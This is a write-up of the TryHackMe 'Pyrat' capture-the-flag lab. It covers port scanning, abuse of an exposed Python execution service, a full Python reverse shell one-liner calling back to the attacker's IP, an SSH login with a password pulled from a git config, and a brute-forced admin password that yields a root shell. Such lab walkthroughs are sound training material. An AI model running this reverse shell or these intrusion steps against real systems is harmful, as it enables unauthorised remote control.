# TryHackMe-Pyrat

## Initial numeration:

Target IP: ```10.10.101.86```

I'll start with a simple port scan.
```bash
nmap -sC -p- 10.10.101.86
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-21 18:18 EEST
Nmap scan report for 10.10.101.86
Host is up (0.071s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
| ssh-hostkey: 
|   3072 30:b8:33:27:1a:f3:a7:5c:58:1c:2f:ee:b2:b3:98:25 (RSA)
|   256 10:b4:0e:ef:db:05:3d:b5:a4:45:71:fd:17:a6:34:0a (ECDSA)
|_  256 8d:5d:bd:31:73:10:5a:cf:51:d3:a5:ea:15:e0:d8:33 (ED25519)
8000/tcp open  http-alt
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
|_http-open-proxy: Proxy might be redirecting requests

Nmap done: 1 IP address (1 host up) scanned in 68.42 seconds
```

Connecting to the following URL: ```http://10.10.101.86:8000``` we get the following message: ```Try a more basic connection```. I'll try to connect via NetCat.

```bash
nc 10.10.101.86 8000                 
sa
name 'sa' is not defined
```

That looks like a python error. We can try some simple python code.
```python
print("hi")
hi
```

## Initial access
I'll use a simple python reverse hell payload:
```python 
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.56.37",6666));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```


## Lateral Movement:
After looking through the file system we get to ```/opt/dev/.git``` where we can find a ```config``` file containg the password for the user ```think```:
```
username = think
password = _TH1NKINGPirate$_
```

I'll use ssh to connect as the ```think``` user.
```bash
ssh think@10.10.101.86
_TH1NKINGPirate$_
```

Going back to the git folder we can now revet to th previous commit which gets us access to:
```bash
git revert HEAD

cat pyrat.py.old 
...............................................

def switch_case(client_socket, data):
    if data == 'some_endpoint':
        get_this_enpoint(client_socket)
    else:
        # Check socket is admin and downgrade if is not aprooved
        uid = os.getuid()
        if (uid == 0):
            change_uid()

        if data == 'shell':
            shell(client_socket)
        else:
            exec_python(client_socket, data)

def shell(client_socket):
    try:
        import pty
        os.dup2(client_socket.fileno(), 0)
        os.dup2(client_socket.fileno(), 1)
        os.dup2(client_socket.fileno(), 2)
        pty.spawn("/bin/sh")
    except Exception as e:
        send_data(client_socket, e

...............................................

```

```python
print(globals())
{'__name__': '__main__', 
'__doc__': None, 
'__package__': None, 
'__loader__': <_frozen_importlib_external.SourceFileLoader object at 0x7f6171a774c0>, 
'__spec__': None, 
'__annotations__': {}, 
'__builtins__': <module 'builtins' (built-in)>, 
'__file__': '/root/pyrat.py', 
'__cached__': None, 
'socket': <module 'socket' from '/usr/lib/python3.8/socket.py'>, 
'sys': <module 'sys' (built-in)>, 
'StringIO': <class '_io.StringIO'>, 
'datetime': <module 'datetime' from '/usr/lib/python3.8/datetime.py'>, 
'os': <module 'os' from '/usr/lib/python3.8/os.py'>, 
'multiprocessing': <module 'multiprocessing' from '/usr/lib/python3.8/multiprocessing/__init__.py'>, 
'manager': <multiprocessing.managers.SyncManager object at 0x7f61719d7640>, 
'admins': <ListProxy object, typeid 'list' at 0x7f617194b9a0>, 
'handle_client': <function handle_client at 0x7f61713228b0>, 
'switch_case': <function switch_case at 0x7f6171322e50>, 
'exec_python': <function exec_python at 0x7f6171322ee0>, 
'get_admin': <function get_admin at 0x7f6171322f70>, 
'shell': <function shell at 0x7f6171329040>, 
'send_data': <function send_data at 0x7f61713290d0>, 
'start_server': <function start_server at 0x7f6171329160>, 
'remove_socket': <function remove_socket at 0x7f61713291f0>, 
'is_http': <function is_http at 0x7f6171329280>, 
'fake_http': <function fake_http at 0x7f6171329310>, 
'change_uid': <function change_uid at 0x7f61713293a0>, 
'host': '0.0.0.0', 'port': 8000}
```

## Privilege Escalation:

After playing around with the http server I got to this:
```bash
nc 10.10.88.124 8000
admin
Password:
```

So, I'll make a simple python script to brute force the password.

```
b'abc123\n'
b'Welcome Admin!!! Type "shell" to begin\n'
```

And now we can use the password to start a root shell using this custom service.
```
Password:
abc123
Welcome Admin!!! Type "shell" to begin
shell
# whoami
whoami
root
```